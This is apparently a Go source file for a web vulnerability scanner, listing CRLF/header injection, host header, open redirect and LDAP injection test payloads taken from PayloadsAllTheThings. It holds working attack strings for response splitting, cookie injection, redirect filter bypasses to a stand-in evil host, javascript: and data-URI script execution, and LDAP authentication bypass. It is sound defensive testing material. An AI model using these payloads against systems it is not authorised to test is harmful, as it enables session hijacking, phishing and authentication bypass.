package payloads

// CRLFAndHeaderPayloads returns CRLF injection, HTTP header injection,
// and host header attack payloads.
// Aligned with OWASP A03:2021 / CWE-113.
func CRLFAndHeaderPayloads() PayloadSet {
	return PayloadSet{
		Category:    PayloadCRLF,
		Description: "CRLF / HTTP Header Injection payloads â€“ OWASP A03:2021 / CWE-113",
		Source:      "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a1/CRLF%20Injection",
		Payloads: []Payload{
			// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ CRLF Injection â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
			{
				ID: "crlf-header-inject", Category: PayloadCRLF,
				Name: "CRLF Header Injection", Value: "%0d%0aX-Vyomite-DAST: crlf-injected",
				Encoded:   "%0d%0aX-Vyomite-DAST:%20crlf-injected",
				Contexts:  []InjectionContext{ContextURLQuery, ContextURLPath, ContextHTTPHeader},
				Detection: DetectReflection, DetectSignature: `X-Vyomite-DAST:\s*crlf-injected`,
				RiskLevel: "SAFE", SafeMode: true,
				CWE: "CWE-113", OWASPCategory: "A03:2021",
				Description: "CRLF injection to add arbitrary response header",
			},
			{
				ID: "crlf-set-cookie", Category: PayloadCRLF,
				Name: "CRLF Set-Cookie Injection", Value: "%0d%0aSet-Cookie:%20vyomite-crlf=true",
				Contexts:  []InjectionContext{ContextURLQuery, ContextHTTPHeader},
				Detection: DetectReflection, DetectSignature: `Set-Cookie:.*vyomite-crlf`,
				RiskLevel: "SAFE", SafeMode: true,
				CWE: "CWE-113", OWASPCategory: "A03:2021",
				Description: "CRLF to inject Set-Cookie header for session fixation",
			},
			{
				ID: "crlf-body-inject", Category: PayloadCRLF,
				Name: "CRLF Body Injection", Value: "%0d%0a%0d%0a<html><body>vyomite-crlf-body</body></html>",
				Contexts:  []InjectionContext{ContextURLQuery},
				Detection: DetectReflection, DetectSignature: `vyomite-crlf-body`,
				RiskLevel: "SAFE", SafeMode: true,
				CWE: "CWE-113", OWASPCategory: "A03:2021",
				Description: "Double CRLF to inject response body content (HTTP response splitting)",
			},
			{
				ID: "crlf-encoded-backslash-n", Category: PayloadCRLF,
				Name: "Unicode CRLF Bypass", Value: "%E5%98%8A%E5%98%8DX-Vyomite-DAST:%20unicode-crlf",
				Contexts:  []InjectionContext{ContextURLQuery, ContextURLPath},
				Detection: DetectReflection, DetectSignature: `X-Vyomite-DAST:.*unicode-crlf`,
				RiskLevel: "SAFE", SafeMode: true,
				CWE: "CWE-113", OWASPCategory: "A03:2021",
				Description: "UTF-8 encoded CRLF (%E5%98%8A%E5%98%8D) to bypass CRLF filters",
			},

			// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Host Header Injection â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
			{
				ID: "host-header-override", Category: PayloadHostHeader,
				Name: "X-Forwarded-Host Override", Value: `evil.vyomite.example.com`,
				Contexts:  []InjectionContext{ContextHTTPHeader},
				Detection: DetectReflection, DetectSignature: `evil\.vyomite\.example\.com`,
				RiskLevel: "SAFE", SafeMode: true,
				CWE: "CWE-644", OWASPCategory: "A05:2021",
				Description: "X-Forwarded-Host header injection to test password reset poisoning",
			},
			{
				ID: "host-header-double", Category: PayloadHostHeader,
				Name: "Duplicate Host Header", Value: "Host: evil.vyomite.example.com",
				Contexts:  []InjectionContext{ContextHTTPHeader},
				Detection: DetectReflection, DetectSignature: `evil\.vyomite\.example\.com`,
				RiskLevel: "SAFE", SafeMode: true,
				CWE: "CWE-644", OWASPCategory: "A05:2021",
				Description: "Second Host header to confuse reverse proxies",
			},
			{
				ID: "host-header-absolute-url", Category: PayloadHostHeader,
				Name: "Absolute URL Host Override", Value: `evil.vyomite.example.com`,
				Contexts:  []InjectionContext{ContextHTTPHeader},
				Detection: DetectReflection, DetectSignature: `evil\.vyomite\.example\.com`,
				RiskLevel: "SAFE", SafeMode: true,
				CWE: "CWE-644", OWASPCategory: "A05:2021",
				Description: "Host header with absolute URL in request line â€” RFC 7230 behavior",
			},
			{
				ID: "host-header-port-inject", Category: PayloadHostHeader,
				Name: "Host Header Port Injection", Value: `target.com:@evil.vyomite.example.com`,
				Contexts:  []InjectionContext{ContextHTTPHeader},
				Detection: DetectReflection, DetectSignature: `evil\.vyomite\.example\.com`,
				RiskLevel: "SAFE", SafeMode: true,
				CWE: "CWE-644", OWASPCategory: "A05:2021",
				Description: "Port section @ sign injection for URL parser confusion",
			},
		},
	}
}

// OpenRedirectPayloads returns open redirect payloads covering various bypass techniques.
// Aligned with OWASP A01:2021 / CWE-601.
func OpenRedirectPayloads() PayloadSet {
	return PayloadSet{
		Category:    PayloadOpenRedirect,
		Description: "Open Redirect payloads â€“ OWASP A01:2021 / CWE-601",
		Source:      "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/3ac27901c711bdf3f5b65a7b1d1820a1/Open%20Redirect",
		Payloads: []Payload{
			{
				ID: "redirect-absolute-url", Category: PayloadOpenRedirect,
				Name: "Absolute URL Redirect", Value: `https://evil.vyomite.example.com/`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextFormBody},
				Detection: DetectStatusCode,
				RiskLevel: "SAFE", SafeMode: true,
				CWE: "CWE-601", OWASPCategory: "A01:2021",
				Description: "Basic absolute URL open redirect test",
			},
			{
				ID: "redirect-protocol-relative", Category: PayloadOpenRedirect,
				Name: "Protocol-Relative Redirect", Value: `//evil.vyomite.example.com/`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextFormBody},
				Detection: DetectStatusCode,
				RiskLevel: "SAFE", SafeMode: true,
				CWE: "CWE-601", OWASPCategory: "A01:2021",
				Description: "Protocol-relative URL to bypass scheme-checking filters",
			},
			{
				ID: "redirect-backslash", Category: PayloadOpenRedirect,
				Name: "Backslash Redirect Bypass", Value: `\/\/evil.vyomite.example.com/`,
				Contexts:  []InjectionContext{ContextURLQuery},
				Detection: DetectStatusCode,
				RiskLevel: "SAFE", SafeMode: true,
				CWE: "CWE-601", OWASPCategory: "A01:2021",
				Description: "Backslash before slashes to bypass regex-based redirect filters",
			},
			{
				ID: "redirect-url-encoded", Category: PayloadOpenRedirect,
				Name: "URL-Encoded Redirect", Value: `%2F%2Fevil.vyomite.example.com%2F`,
				Contexts:  []InjectionContext{ContextURLQuery},
				Detection: DetectStatusCode,
				RiskLevel: "SAFE", SafeMode: true,
				CWE: "CWE-601", OWASPCategory: "A01:2021",
				Description: "URL-encoded protocol-relative redirect bypass",
			},
			{
				ID: "redirect-javascript", Category: PayloadOpenRedirect,
				Name: "JavaScript Protocol Redirect", Value: `javascript:alert('vyomite-redirect')`,
				Contexts:  []InjectionContext{ContextURLQuery, ContextFormBody},
				Detection: DetectReflection, DetectSignature: `javascript:alert`,
				RiskLevel: "SAFE", SafeMode: true,
				CWE: "CWE-601", OWASPCategory: "A01:2021",
				Description: "JavaScript pseudo-protocol in redirect parameter",
			},
			{
				ID: "redirect-data-uri", Category: PayloadOpenRedirect,
				Name: "Data URI Redirect", Value: `data:text/html;base64,PHNjcmlwdD5hbGVydCgndnlvbWl0ZScpPC9zY3JpcHQ+`,
				Contexts:  []InjectionContext{ContextURLQuery},
				Detection: DetectReflection, DetectSignature: `data:text/html`,
				RiskLevel: "SAFE", SafeMode: true,
				CWE: "CWE-601", OWASPCategory: "A01:2021",
				Description: "Data URI scheme redirect for script execution",
			},
			{
				ID: "redirect-at-sign-bypass", Category: PayloadOpenRedirect,
				Name: "At-Sign Userinfo Bypass", Value: `https://target.com@evil.vyomite.example.com/`,
				Contexts:  []InjectionContext{ContextURLQuery},
				Detection: DetectStatusCode,
				RiskLevel: "SAFE", SafeMode: true,
				CWE: "CWE-601", OWASPCategory: "A01:2021",
				Description: "@ sign to trick origin validation into accepting attacker domain",
			},
			{
				ID: "redirect-null-byte", Category: PayloadOpenRedirect,
				Name: "Null Byte Redirect", Value: `https://target.com%00@evil.vyomite.example.com/`,
				Contexts:  []InjectionContext{ContextURLQuery},
				Detection: DetectStatusCode,
				RiskLevel: "SAFE", SafeMode: true,
				CWE: "CWE-601", OWASPCategory: "A01:2021",
				Description: "Null byte before @ sign for parser-based filter bypass",
			},
			{
				ID: "redirect-tab-newline", Category: PayloadOpenRedirect,
				Name: "Tab/Newline Bypass", Value: "http://evil.vyomite.example.com/%09%0a",
				Contexts:  []InjectionContext{ContextURLQuery},
				Detection: DetectStatusCode,
				RiskLevel: "SAFE", SafeMode: true,
				CWE: "CWE-601", OWASPCategory: "A01:2021",
				Description: "Tab and newline characters to bypass URL parsing",
			},

			// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ LDAPi â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
		},
	}
}

// LDAPInjectionPayloads returns LDAP injection payloads for directory service exploitation.
// Aligned with OWASP A03:2021 / CWE-90.
func LDAPInjectionPayloads() PayloadSet {
	return PayloadSet{
		Category:    PayloadLDAPi,
		Description: "LDAP Injection payloads â€“ OWASP A03:2021 / CWE-90",
		Source:      "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/3ac27901c711bdf3f5b65a7b1d1820a1/LDAP%20Injection",
		Payloads: []Payload{
			{
				ID: "ldapi-wildcard", Category: PayloadLDAPi,
				Name: "LDAP Wildcard Authentication Bypass", Value: `*`,
				Contexts:  []InjectionContext{ContextFormBody, ContextURLQuery},
				Detection: DetectContentDiff,
				RiskLevel: "SAFE", SafeMode: true,
				CWE: "CWE-90", OWASPCategory: "A03:2021",
				Description: "Wildcard in LDAP filter to match all entries",
			},
			{
				ID: "ldapi-or-true", Category: PayloadLDAPi,
				Name: "LDAP OR True Bypass", Value: `*)(uid=*))(|(uid=*`,
				Contexts:  []InjectionContext{ContextFormBody, ContextURLQuery},
				Detection: DetectContentDiff,
				RiskLevel: "SAFE", SafeMode: true,
				CWE: "CWE-90", OWASPCategory: "A03:2021",
				Description: "LDAP filter injection to create always-true OR condition",
			},
			{
				ID: "ldapi-null-bind", Category: PayloadLDAPi,
				Name: "LDAP Null Bind Probe", Value: `)(cn=))(|(cn=`,
				Contexts:  []InjectionContext{ContextFormBody, ContextURLQuery},
				Detection: DetectContentDiff,
				RiskLevel: "SAFE", SafeMode: true,
				CWE: "CWE-90", OWASPCategory: "A03:2021",
				Description: "LDAP filter manipulation for null bind authentication bypass",
			},
			{
				ID: "ldapi-admin-enum", Category: PayloadLDAPi,
				Name: "LDAP Admin Enumeration", Value: `admin*)(|(objectclass=*`,
				Contexts:  []InjectionContext{ContextFormBody, ContextURLQuery},
				Detection: DetectContentDiff,
				RiskLevel: "SAFE", SafeMode: true,
				CWE: "CWE-90", OWASPCategory: "A03:2021",
				Description: "LDAP injection to enumerate admin-prefixed users",
			},
			{
				ID: "ldapi-comment-bypass", Category: PayloadLDAPi,
				Name: "LDAP Comment/Close Bypass", Value: `*))%00`,
				Encoded:   `*))%00`,
				Contexts:  []InjectionContext{ContextFormBody, ContextURLQuery},
				Detection: DetectContentDiff,
				RiskLevel: "SAFE", SafeMode: true,
				CWE: "CWE-90", OWASPCategory: "A03:2021",
				Description: "Null byte to terminate LDAP filter and bypass remaining conditions",
			},
		},
	}
}
